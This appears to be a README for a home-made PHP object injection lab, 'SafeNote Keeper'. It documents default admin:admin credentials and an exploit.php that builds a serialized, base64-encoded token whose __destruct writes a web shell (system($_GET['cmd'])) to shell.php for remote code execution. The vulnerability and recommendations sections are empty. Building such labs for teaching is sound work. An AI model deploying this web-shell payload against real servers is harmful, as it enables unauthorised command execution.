# InsecureDeserialization-lab2

### 1-Description
```
In this lab i have decided to create an exploitable app that use php serialize() / unserialize()
and the magic method __destruct() magic method which is called whenever an object is destroyed.
```
### 2-Ressoources
```
https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection

https://www.php.net/manual/en/function.unserialize.php

https://securitycafe.ro/2015/01/05/understanding-php-object-injection
```

### 3-SafeNote Kepper
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/bdf7e33f-2a43-4e4f-ad73-1024b353b22f)

Login as admin!!!
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/73adb498-d9cc-4448-9314-e0231bc63db6)

```
admin:admin
```
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/0117bedf-4dce-474a-ad74-b9e1dbde2d42)
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/6552f369-ba38-464c-8037-d11a02118f8c)
Notes Endpoint!!!
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/4ddab522-b569-4425-92cf-83d2d44b6f38)
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/a24a70e1-fbd0-48fa-9236-037b978a4bf3)
### 4-Vulnerability
```

```

### 5-Exploitation
exploit.php!!!
```php
<?php
class User{
    public $name = "admin";
    public $level = "";
    public $filename = "shell.php";
    public $message = "<?php system(\$_GET['cmd']); ?>";
}
//admin 
$admin = new User();
echo serialize($admin);
echo "\n";
$Token1 = base64_encode(serialize($admin));
echo $Token1;
?>
```
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/ee403d0c-f105-4679-9009-b83f0d708ab7)
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/0eba3886-696c-48b6-97e0-31e6befc6c2d)
RCE!!!
![image](https://github.com/gil01karougbe/InsecureDeserialization-lab2/assets/98090770/07032ba2-6d44-4b86-abd9-c1837a1c4e6b)
### 6-Recommendations
```

```

### 7-Labs
```
Debug(Tryhackme)
```
